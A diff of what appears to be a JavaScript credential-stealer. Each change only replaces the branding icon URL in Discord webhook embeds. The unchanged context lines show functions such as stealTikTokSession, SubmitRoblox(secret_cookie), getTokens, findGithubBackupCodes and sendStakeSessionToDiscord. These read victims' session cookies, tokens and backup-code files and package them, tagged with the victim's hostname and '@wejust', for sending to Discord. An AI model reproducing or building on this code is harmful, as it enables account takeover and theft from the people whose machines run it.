@@ -462,7 +462,7 @@ async function findBackupCodes() {
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
                 text: `${user.hostname} | @wejust |`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
               },
             };
 
@@ -515,7 +515,7 @@ async function findEpicGamesBackupCodes() {
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
                 text: `${user.hostname} | @wejust |`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
               },
             };
 
@@ -567,7 +567,7 @@ async function findGithubBackupCodes() {
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
                 text: `${user.hostname} | @wejust |`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
               },
             };
 
@@ -1432,7 +1432,7 @@ async function SubmitRoblox(secret_cookie) {
       ],
       footer: {
         text: `${user.hostname} | @wejust |`,
-        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+        icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
       },
     };
 
@@ -1612,7 +1612,7 @@ function stealTikTokSession(cookie) {
                       ],
                       footer: {
                         text: `${user.hostname} | @wejust |`,
-                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                        icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
                       },
                     }
                   ]
@@ -1698,7 +1698,7 @@ function setRedditSession(cookie) {
                             ],
                             footer: {
                                 text: `${user.hostname} | @wejust |`,
-                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                                icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553'
                             },
                             author: {
                                 name: "Reddit Session Detected",
@@ -1945,7 +1945,7 @@ async function getTokens() {
                 ],
                 footer: {
                     text: `${user.hostname} | @wejust |`,
-                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                    icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553'
                 }
             };
 
@@ -2605,7 +2605,7 @@ function createSteamEmbed(account, accountInfo, games, level) {
         ],
         footer: {
             text: `${user.hostname} | @wejust |`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
         },
     };
 }
@@ -3136,7 +3136,7 @@ try {
         color: 0x303037,
         author: {
             name: `${user.hostname} | System Information | @wejust`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
         },
         fields: [
             {
@@ -3193,7 +3193,7 @@ try {
         ],
         footer: {
             text: `${user.hostname} | @wejust |`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
         },
     };
 
@@ -3776,7 +3776,7 @@ async function sendKeywordsToDiscord(keywords) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @wejust |`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553'
             }
         };
 
@@ -3803,7 +3803,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @wejust |`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553'
             },
             "thumbnail": {
                 "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
@@ -3980,7 +3980,7 @@ async function RiotGameSession(cookie) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @wejust |`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
             "author": {
